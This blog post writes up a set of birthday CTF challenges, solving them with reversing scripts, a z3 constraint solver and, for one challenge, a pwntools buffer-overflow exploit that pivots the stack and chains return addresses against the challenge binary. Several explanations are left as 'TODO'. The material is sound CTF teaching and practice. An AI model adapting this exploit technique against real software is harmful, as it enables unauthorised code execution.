---
layout: post
title: "Birthday CTF 2020: Writeup"
date: 2020-04-21 13:00
type: post
published: true
comments: false
categories: ctf
---

Last Tuesday was the day of my 29th birthday. I was sitting a my computer working from home when suddenly, at 15:00, my Twitter notifications exploded.
My teammates and a few of our CTF friends had prepared a CTF challenge each for me. It was one of best birthday presents I've ever received I think and I was basically sitting there laughing as I saw all the tweets rolling in.
It actually took me a week to solve the challenges. I blame work and other commitments but I did solve them in the end. Naturally I have to finish it with writing a write-up for the challenges.
Each challenge was provided as a Tweet directed at me with the [hashtag #ZetaTwoCTFVirtuoso](https://twitter.com/hashtag/ZetaTwoCTFVirtuoso) except two which were follow-ups to another challenge.

## [quend's Challenge](https://twitter.com/Calaquendi44/status/1250046149026873344)

The QR code decodes into a URL from which we can download a file which seems to be some kind of text file:

{% highlight bash %}
$ zbarimg challenge.jpeg
QR-Code:http://www.sophia.re/chal.ll
scanned 1 barcode symbols from 1 images in 0.28 seconds
$ curl -o cha.ll 'https://www.sophia.re/chal.ll'
$ file cha.ll 
cha.ll: ASCII text, with very long lines

{% endhighlight %}

Looking at the filename and the contents of the file we see that this is LLVM code which we can compile:

{% highlight bash %}
$ head cha.ll 
; ModuleID = 'x.cc'
source_filename = "x.cc"
target datalayout = "e-m:o-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-apple-macosx10.15.0"

%struct.flag_hash = type { [9 x i32] }
%struct.bday_hash = type <{ %"class.std::__1::basic_string", [9 x i32], [4 x i8] }>
%"class.std::__1::basic_string" = type { %"class.std::__1::__compressed_pair" }
%"class.std::__1::__compressed_pair" = type { %"struct.std::__1::__compressed_pair_elem" }
%"struct.std::__1::__compressed_pair_elem" = type { %"struct.std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >::__rep" }

$ clang -o chall cha.ll -lstdc++
{% endhighlight %}

For some reason I couldn't compile this with clang on Linux so I did it on my Macbook instead.

TODO

{% highlight c++ %}
int main(int argc, const char **argv, const char **envp)
{
  ...
  std::operator<<<std::char_traits<char>>(std::cout, "Please, enter the key: ");
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, bday);
  std::string::c_str((QHashData::Node *)bday);
  if ( strlen(input) == 18 )
  {
    for ( i = 0; i < 9; ++i )
      bday[i + 6] = xml_strhash(&input[2 * i], 2);
    for ( j = 0; j < 9; ++j )
    {
      if ( bday[j + 6] != flag_hash[j] )
      {
        std::operator<<<std::char_traits<char>>(&std::cout, "Failure...\n");
        return -2;
      }
    }
    std::operator<<<std::char_traits<char>>(&std::cout, "You did it! Flag is BDayCTF{");
    v5 = std::operator<<<char>(v4, bday);
    std::operator<<<std::char_traits<char>>(v5, "}\n");
    result = 0;
  }
  else
  {
    std::operator<<<std::char_traits<char>>(&std::cout, "Nope!\n");
    result = -1;
  }
  return result;
}

__int64 xml_strhash(const unsigned __int8 *data, int len)
{
  ...
  cur_ptr = data;
  result = 0;
  ...
  while ( len-- )
  {
    cur_ptr2 = cur_ptr++;
    result = (*cur_ptr2 + 0x10 * result) ^
     ((((*cur_ptr2 + 0x10 * result) & 0xF0000000) >> 24) | 
     (*cur_ptr2 + 0x10 * result) & 0xF0000000);
  }
  return result;
}
{% endhighlight %}

TODO

{% highlight c++ %}
__data:0000000100004110 flag_hash_const dd 1891, 1711, 1984, 1967, 870, 1727, 1841, 1956, 849
{% endhighlight %}

TODO

{% highlight python %}
#!/usr/bin/env python3

import itertools
import string

target = [1891, 1711, 1984, 1967, 870, 1727, 1841, 1956, 849]
assert len(target) == 9

def xml_strhash(data):
    result = 0
    for b in data:
        result = (b + result *16) ^ ((((b + result *16) & 0xF0000000) >> 24) | (b + result *16) & 0xF0000000)
        result &= 0xFFFFFFFF
    return result

pairs = [set() for _ in range(9)]

for pair in itertools.product(string.printable, repeat=2):
    pair_hash = xml_strhash(''.join(pair).encode('ascii'))
    try:
        pair_idx = target.index(pair_hash)
        pairs[pair_idx].add(pair)
        print('pairs[%d] = %s' % (pair_idx, pair))
    except ValueError:
        pass

for p in pairs:
    print(','.join(''.join(x) for x in p))
{% endhighlight %}

TODO

{% highlight bash %}
$ python3 solve.py
rC,pc,qS,os,s3,t#
fO,e_,g?,h/,do
x@,y0,v`,up,wP,z
x/,u_,vO,w?,to
0f,/v,4&,2F,36,1V
f_,h?,i/,eo,gO
q!,oA,nQ,ma,lq,p1
vD,td,st,x$,w4,uT
21,1A,0Q,.q,/a,3!
{% endhighlight %}

TODO

`s3`, `e_`, `y0`, `u_`, `0f`, `f_`, `p1`, `st`, `3!`

TODO

Flag: BDayCTF{s3e_y0u_0ff_p1st3!}

## [b0bb's Challenge](https://twitter.com/0xb0bb/status/1250046144421474304)

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

ADDR_BOF_OFF = 0x0804861E
ADDR_INIT_MEM = 0x080485D0
ADDR_INIT_BANNER = 0x08048596
ADDR_PRINT_BANNER = 0x08048649
ADDR_EXIT = 0x08048613

FAKE_STACK = 0x804d000 - 0x100

r = process('./challenge')
r.recvuntil('bof: ')

pause()

payload1 = b''
#payload1 += cyclic(29)
payload1 += b'A'*cyclic_find(0x61616165)
payload1 += p32(FAKE_STACK) # Writable area
payload1 += p32(ADDR_BOF_OFF)
r.sendline(payload1)

payload2 = b''
#payload2 += cyclic(29)
payload2 += b'B'*cyclic_find(0x61616165)
payload2 += p32(FAKE_STACK + 1*4)
payload2 += p32(ADDR_INIT_MEM)
payload2 += p32(ADDR_BOF_OFF)
r.sendline(payload2)

payload2 = b''
#payload2 += cyclic(29)
payload2 += b'B'*cyclic_find(0x61616165)
payload2 += p32(FAKE_STACK + 2*4)
payload2 += p32(ADDR_INIT_BANNER)
payload2 += p32(ADDR_BOF_OFF)
r.sendline(payload2)

payload2 = b''
#payload2 += cyclic(29)
payload2 += b'B'*cyclic_find(0x61616165)
payload2 += p32(FAKE_STACK + 3*4)
payload2 += p32(ADDR_PRINT_BANNER)
payload2 += p32(ADDR_BOF_OFF)
r.sendline(payload2)

payload2 = b''
#payload2 += cyclic(29)
payload2 += b'B'*cyclic_find(0x61616165)
payload2 += p32(FAKE_STACK + 4*4)
payload2 += p32(ADDR_EXIT)
payload2 += p32(0)
r.sendline(payload2)

banner = r.recvall()
sys.stdout.buffer.write(banner)

r.interactive()
{% endhighlight %}

TODO

![b0bb's challenge flag](/assets/images/ctf/bday-b0bb-flag.png)

TODO

Flag: BDayCTF{Many_Happy_Returns}

## [capsl's Challenge](https://twitter.com/capslcc/status/1250046148133277698)

TODO

{% highlight python %}
print(bytes.fromhex('%x' % 668430635688626836307545807846250470926814185595574578375052469735293834318137052219361513769677150920763734277731983741).decode('ascii'))
{% endhighlight %}

TODO

Flag: BDayCTF{Happy~bday~Z!~let~2020~be~HAX~n~awesome!!}

## [Steven's Challenge](https://twitter.com/StevenVanAcker/status/1250046150347853824)

TODO

![Steven's challenge image](/assets/images/ctf/bday-steven-challenge.jpg)

TODO

{% highlight python %}
#!/usr/bin/env python3

from z3 import *

s = Solver()

e_waving = Int('e_waving')
e_kiss = Int('e_kiss')
e_dancer2 = Int('e_dancer2')
e_balloon = Int('e_balloon')
e_popper = Int('e_popper')
e_drink = Int('e_drink')
e_party = Int('e_party')
e_rose = Int('e_rose')
e_popperball = Int('e_popperball')
e_calendar = Int('e_calendar')
e_present = Int('e_present')
e_martini = Int('e_martini')
e_cake = Int('e_cake')
e_flowers = Int('e_flowers')
e_dancer = Int('e_dancer')

emojis = [e_waving,e_kiss,e_dancer2,e_balloon,e_popper,e_drink,e_party,e_rose,e_popperball,e_calendar,e_present,e_martini,e_cake,e_flowers,e_dancer]
for e in emojis:
    s.add(And(e >= 0, e < 127))
s.add(e_present == ord('y'))

s.add(e_waving == e_kiss + 2)
s.add(e_dancer2 + e_balloon + e_waving + e_popper == e_drink + e_party + e_drink + e_kiss + 44)
s.add(e_rose + e_popper + e_popperball + e_drink == e_party + e_drink + e_calendar + e_balloon + 125)
s.add(e_dancer + e_party + e_popperball + e_party == e_cake + e_present + e_balloon + e_martini + 35)
s.add(e_cake + e_party + e_popperball + e_present == e_kiss + e_flowers + e_balloon + e_flowers + 87)
s.add(e_party + e_popper + e_popperball + e_calendar == e_rose + e_balloon + e_popper + e_kiss + 5)
s.add(e_popper + e_balloon + e_present + e_party == e_balloon + e_balloon + e_popper + e_kiss + 20)
s.add(e_cake + e_present + e_drink + e_drink == e_rose + e_kiss + e_drink + e_martini + 2)
s.add(e_flowers + e_popper + e_rose + e_kiss == e_cake + e_dancer2 + e_party + e_balloon + 101)
s.add(e_popper + e_dancer2 + e_kiss + e_present == e_balloon + e_popper + e_flowers + e_martini + 183)
s.add(e_dancer + e_popper + e_popperball + e_party == e_kiss + e_flowers + e_drink + e_balloon + 84)
s.add(e_dancer + e_popper + e_rose + e_popper == e_drink + e_waving + e_popper + e_flowers + 85)
s.add(e_party + e_drink + e_waving + e_drink == e_martini + e_popperball + e_drink + e_party + 32)

if s.check() == sat:
    m = s.model()
    flag = list('BDa') + [e_present] + list('CTF{') + [
        e_popper, e_party, e_balloon, e_kiss, e_present, e_drink, e_waving, e_flowers, e_popper,
        e_drink, e_balloon, e_popperball, e_flowers, e_martini, e_dancer, e_party, e_popper, e_drink,
        e_calendar, e_balloon, e_rose, e_drink, e_balloon, e_popper, e_flowers, e_dancer2, e_popperball,
        e_kiss, e_drink, e_martini, e_dancer, e_party, e_drink, e_cake, e_dancer2, e_popperball
    ] + list('}')
    flag = ''.join(x if type(x) == str else chr(m[x].as_long()) for x in flag)
    print(flag)
else:
    print('unsat')
{% endhighlight %}

TODO

Flag: BDayCTF{r34dy_f0r_4n07h3r_l4p_4r0und_7h3_5un}

## [avlidienbrunn's Challenge](https://twitter.com/avlidienbrunn/status/1250046160603144193)

Flag: BDayCTF{at least basing 64 has support for space}

## [likvidera's Challenge](https://twitter.com/likvidera/status/1250046386470555648)

Flag: BDayCTF{HaPPy_b1rthd4y!!}

## [Lars's Challenge](https://twitter.com/_LarsH/status/1250046396671184903)

Flag: BDayCTF{:eggplant:+:eggplant:+:eggplant:}

## [Bill's Challenge](https://twitter.com/noteyler/status/1250046144505212928)

Flag: BDayCTF{hAvE_a_g00d_oNe_ZeTaTwO}

## [bootplug's Challenge](https://twitter.com/bootplug_ctf/status/1250046146262773768)

Flag: BDayCTF{keep_up_the_good_work!_love_from_bootplug<3}

## [OverTheWire's Challenge](https://twitter.com/OverTheWireCTF/status/1250046146996834304)

Flag: DayCTF{sTiLl_g0T_iT_1N_y0Ur_0Ld_4G3!}

## [watevr's Challenge](https://twitter.com/watevr_team/status/1250046548144205824)

Flag: "Grattis på 33 års dagen Calle, du verkar ha dina skills i behåll trots din ålder"

## nnewram's Challenge

URL: https://watevr.xyz/zeta.c  
Flag: BDayCTF{gr4771s_på_föd3ls3d4g3n_Z3t4_från_w4t3vr_@nnewram}

## Loke's Challenge

Data: 

```:?ABCDEFGHI;J5KLMNOPQRSTUVWXYZ[\3) $!7&]1/^_`ab>+cde%fghi4jklmn-o".p29qr(,stuvw=*x0y8z{<|#6'}@```  

Flag: BDayCTF{hApPi_bIrHd@Y-zEte +woO!}

